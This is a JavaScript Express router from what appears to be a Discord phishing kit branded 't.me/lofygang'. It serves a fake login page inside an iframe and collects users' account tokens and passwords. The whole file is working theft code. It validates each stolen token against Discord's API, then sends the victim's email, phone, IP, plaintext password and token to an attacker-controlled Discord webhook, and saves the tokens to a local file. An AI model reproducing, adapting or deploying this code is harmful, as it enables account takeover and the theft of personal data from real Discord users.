import fs from 'fs/promises'
import path from 'path'

import express from 'express'
import got from 'got'

import { Webhook, MessageBuilder } from 'discord-webhook-node'

import config from '../../config.json' with {
    type: 'json'
}

const app = express.Router()

const hook = new Webhook({
    url: config['webhook'],
    throwErrors: true,
    retryOnLimit: true
})

hook.setUsername('t.me/lofygang')
hook.setAvatar('https://i.pinimg.com/564x/b4/81/38/b48138160f5a3f923fd5d19dc9bd8c68.jpg')

app.post('/login', async (req, res) => {
    const {
        token,
        password
    } = req.body

    if (!token || !password) {
        return res.status(400).json({
            status: 400
        })
    }

    const api = await got({
        throwHttpErrors: false,
        retry: {
            limit: 5
        },
        url: 'https://discord.com/api/v9/users/@me',
        method: 'get',
        headers: {
            authorization: token,
            'content-type': 'application/json'
        }
    })

    var status = api.statusCode
    var body = api.body

    try {
        body = JSON.parse(body)
    } catch (error) {
        return res.status(status).json({
            status: status
        })
    }

    if (!body['id']) {
        return res.status(status).json({
            status: status
        })
    }

    const embed = new MessageBuilder()
        .setTitle('Discord 🎣')
        .setAuthor('By PolarLofy', 'https://i.pinimg.com/564x/b4/81/38/b48138160f5a3f923fd5d19dc9bd8c68.jpg', 'https://t.me/lofygang')
        .setURL('https://t.me/lofygang')
        .addField('🆔 Id', '\`\`\`' + body['id'] + '\`\`\`')
        .addField('👤 Username', '\`\`\`' + body['username'] + '\`\`\`')
        .addField('👤 Global Name', '\`\`\`' + body['global_name'] + '\`\`\`')
        .addField('🔒 MFA', '\`\`\`' + (body['mfa_enabled'] ? '✅' : '❌') + '\`\`\`', true)
        .addField('🈺 Language', '\`\`\`' + body['locale'] + '\`\`\`', true)
        .addField('🎁 Nitro', '\`\`\`' + (body['premium_type'] === 0 ? '❌' : body['premium_type'] === 2 ? 'Gaming' : 'Basic') + '\`\`\`', true)
        .addField('✉ Email', '\`\`\`' + body['email'] + '\`\`\`')
        .addField('🔑 Password', '||' + password + '||')
        .addField('✉ Verified Email', '\`\`\`' + (body['verified'] ? '✅' : '❌') + '\`\`\`')
        .addField('📱 Phone', '\`\`\`' + body['phone'] + '\`\`\`')
        .addField('🧤 NSFW', '\`\`\`' + (body['nsfw_allowed'] ? '✅' : '❌') + '\`\`\`', true)
        .addField('↗ Ip', '\`\`\`' + (req.ip ?? '❌') + '\`\`\`', true)
        .addField('🍪 Token', '||' + token + '||')
        .setColor('#a454b4')
        .setThumbnail(body['avatar'] ? `https://cdn.discordapp.com/avatars/${body['id']}/${body['avatar']}` : 'https://i.pinimg.com/564x/b7/f0/db/b7f0db1455d5a1fcfdb41ef6a13822e2.jpg')
        .setFooter('t.me/lofygang', 'https://i.pinimg.com/564x/b4/81/38/b48138160f5a3f923fd5d19dc9bd8c68.jpg')
        .setTimestamp()

    hook.send(embed)

    await fs.appendFile(path.join(DIRNAME, 'util', 'token.txt'), `${token}\n`)

    return res.status(200).json({
        status: 200
    })
})

app.get('/login', async (req, res) => {
    var {
        iframe
    } = req.query

    if (!iframe) {
        return res.redirect('/')
    } else {
        return res.sendFile(path.join(DIRNAME, 'public', 'login.html'))
    }
})

export default app